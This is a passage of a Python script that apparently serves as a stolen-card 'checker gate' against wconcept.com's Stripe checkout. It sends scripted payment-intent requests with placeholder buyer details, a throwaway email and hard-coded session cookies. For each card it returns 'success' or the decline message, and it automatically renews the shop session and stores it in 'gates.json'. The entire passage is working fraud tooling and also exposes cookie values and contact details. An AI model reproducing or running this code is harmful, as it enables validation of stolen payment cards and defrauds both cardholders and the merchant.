	    'referer': 'https://m.wconcept.com/order/checkout.html?type=pay&addrseNm=mska&addrseFamilyNm=wj&addrseBaseAddr=2058+Duncan+Avenue&addrseDetailAddr=&addrseCtyNm=Huntington&addrseLcltyUsCd=NY&addrseLcltyCd=LCLTY_33&addrseLcltyNm=New+York&addrsePostNo=11743&addrseMobilNo=2076516786&dlvAdbukTurn=0&coprtNm=',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'ord': {
	        'ordEmail': 'visaspam77@gmail.com',
	        'nationCd': 'us',
	        'bllgAddrseNm': 'mska',
	        'bllgAddrseFamilyNm': 'wj',
	        'bllgCoprtNm': '',
	        'bllgBaseAddr': '2058 Duncan Avenue',
	        'bllgDetailAddr': '',
	        'bllgCtyNm': 'Huntington',
	        'bllgLcltyNm': 'New York',
	        'bllgPostNo': '11743',
	        'bllgAddrseMobilNo': '2076516786',
	        'bllgAddrseMobilNationNo': '1',
	        'bllgNaionCd': 'us',
	        'bllgEmail': 'visaspam77@gmail.com',
	    },
	    'lgsDlvspVOList': [
	        {
	            'addrseNm': 'mska',
	            'addrseFamilyNm': 'wj',
	            'coprtNm': '',
	            'addrsePostNo': '11743',
	            'addrseBaseAddr': '2058 Duncan Avenue',
	            'addrseDetailAddr': '',
	            'addrseCtyNm': 'Huntington',
	            'addrseLcltyCd': 'LCLTY_33',
	            'addrseLcltyNm': 'New York',
	            'addrseLcltyUsCd': 'NY',
	            'addrseMobilNo': '2076516786',
	            'addrseMobilNationNo': '1',
	            'addrseNationCd': 'us',
	        },
	    ],
	    'shipDlvAdbukTurn': '0',
	    'bllgLcltyCd': 'LCLTY_33',
	    'bllgDlvAdbukTurn': '0',
	    'paymentMethodId': id,
	    'stripeVO': {
	        'customerId': None,
	        'payNo': no,
	    },
	}
	
	response = requests.post('https://m.wconcept.com/api/stripe/payment-intent', cookies=cookies, headers=headers, json=json_data)
	if 'success' in response.text:
		return 'success'
	elif 'There is no session information. Please order again.' in response.text:
		headers = {
		    'accept': 'application/json',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'pragma': 'no-cache',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		
		params = {
		    'bypassSessionYn': 'N',
		}
		
		response = requests.get('https://m.wconcept.com/api/common/cart-count', params=params, headers=headers)
		
		cookies = str(response.cookies)
		
		wcus_fo_session_prod = re.search(r'wcus-fo-session-prod=(.*?)[, ]', cookies).group(1)
		cp=(wcus_fo_session_prod)
		cookies = {
    'recordID': '9ec818c9-94e5-4bdd-9387-77693ad0fa1a',
    '_ga': 'GA1.1.1062965470.1712470406',
    '_tt_enable_cookie': '1',
    '_ttp': 'SePZUmlmPp4tjpxSCi1sG4_2CrN',
    '_pin_unauth': 'dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw',
    '_fbp': 'fb.1.1712470408911.1674008412',
    'wusCtgryNm': 'WOMEN',
    'agreeYn': 'Y',
    'ypa': 'YP1.kMA9g6KRN-7kH7mXmnQy',
    '__stripe_mid': '746feca8-88e2-4389-bf4a-e737b754c301ef05ca',
    '_gcl_au': '1.1.444116769.1712504287',
    'apay-session-set': 'pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D',
    'dmSessionID': 'bb61e790-51ff-4433-a5e6-927b4c52bcc5',
    'wcus-fo-session-prod': cp,
    'ESW_LTI': '{%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}',
    'hidePrmNoti': 'Y',
    'hideGuideYn': 'Y',
    '_TODAYALLLIST': '%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22720088284%22%2C%22regDt%22%3A1712618711256%7D%5D',
    '__stripe_sid': '29421c03-cdf4-4c89-b519-fa96370eb693ebad0a',
    'language': 'en_US',
    'ledgerCurrency': 'USD',
    'cto_bundle': '1yUvwV8wV3g5NE4zYmtBNXVPSTR2bkpvbWhFT0FmbSUyQm4zeEdmNyUyRkt0eDF1anF3NWNrUFlHY3JCVEYybjFhZzZHRzlnUDlPdUFlSjRUWXljVWlnWUQxJTJGTmdlZFhYMExHTkVYMGFqTXNqZ1lkeXFLaXBSaUZvVzQzSnZGNm1pNUo5SEQ3NGdPRk9JczVBaDRONTRZUUtFb3Q5dFElM0QlM0Q',
    '_ga_0G3GV44XGJ': 'GS1.1.1712618630.4.1.1712619862.0.0.0',
    '_ga_5Y8Z74CC6Y': 'GS1.1.1712618622.6.1.1712619862.48.0.971558836',
}
		
		headers = {
		    'authority': 'm.wconcept.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'cache-control': 'max-age=0',
		    # 'cookie': 'recordID=9ec818c9-94e5-4bdd-9387-77693ad0fa1a; _ga=GA1.1.1062965470.1712470406; _tt_enable_cookie=1; _ttp=SePZUmlmPp4tjpxSCi1sG4_2CrN; _pin_unauth=dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw; _fbp=fb.1.1712470408911.1674008412; wusCtgryNm=WOMEN; agreeYn=Y; hidePrmNoti=Y; ypa=YP1.kMA9g6KRN-7kH7mXmnQy; __stripe_mid=746feca8-88e2-4389-bf4a-e737b754c301ef05ca; _gcl_au=1.1.444116769.1712504287; language=en_US; ledgerCurrency=USD; apay-session-set=pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D; dmSessionID=e5113d4c-f2d0-43e6-a199-de2549c06f53; wcus-fo-session-prod=cDJjMGZmOGNkNzVmOTVmOTBjMmFmMGU4OGE0ZTViMGJmYzQ0ZDRlNGZhOWY3N2Q5ZmYyMzFkYTFl; ESW_LTI={%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}; _TODAYALLLIST=%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22710791406%22%2C%22regDt%22%3A1712521186008%7D%5D; __stripe_sid=c6457e1f-d114-450d-b214-b554024d94c95c71d8; cto_bundle=rptFDl8wV3g5NE4zYmtBNXVPSTR2bkpvbWhNJTJCamFzV2xTRUxvVElFR1lid0RDdUpSY0M4JTJGd0p0VktvemgzaHllUlFEbkkzJTJCc25XeklJdVk2T1dPY21oJTJGNHB1SU1UN1U2bUNmMGZNeUFmV05ZNTF3Qzd6ZFAlMkZlOFdCYVFRQlpCdSUyQldNczJheWdFaU5VVFpCJTJGaUt0SGJUNGxHZyUzRCUzRA; _ga_0G3GV44XGJ=GS1.1.1712521176.3.1.1712521739.0.0.0; _ga_5Y8Z74CC6Y=GS1.1.1712521170.4.1.1712521739.60.0.118374253',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'none',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		params = {
		    'type': 'pay',
		    'addrseNm': 'mska',
		    'addrseFamilyNm': 'wj',
		    'addrseBaseAddr': '2058 Duncan Avenue',
		    'addrseDetailAddr': '',
		    'addrseCtyNm': 'Huntington',
		    'addrseLcltyUsCd': 'CO',
		    'addrseLcltyCd': 'LCLTY_06',
		    'addrseLcltyNm': 'Colorado',
		    'addrsePostNo': '11743',
		    'addrseMobilNo': '2076516786',
		    'dlvAdbukTurn': '0',
		    'coprtNm': '',
		}
		
		response = requests.get('https://m.wconcept.com/order/checkout.html', params=params, cookies=cookies, headers=headers)
		text=(response.text)
		payNo_pattern = re.compile(r'"payNo":"([^"]+)"')
		matches = payNo_pattern.search(text)
		payNo = matches.group(1)
		
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		json_data['session'] = cp
		json_data['payNo'] = payNo
		with open('gates.json', 'w') as file:
			json.dump(json_data, file, indent=2)
	return (response.json()['errorMessage']).split(';')[0]
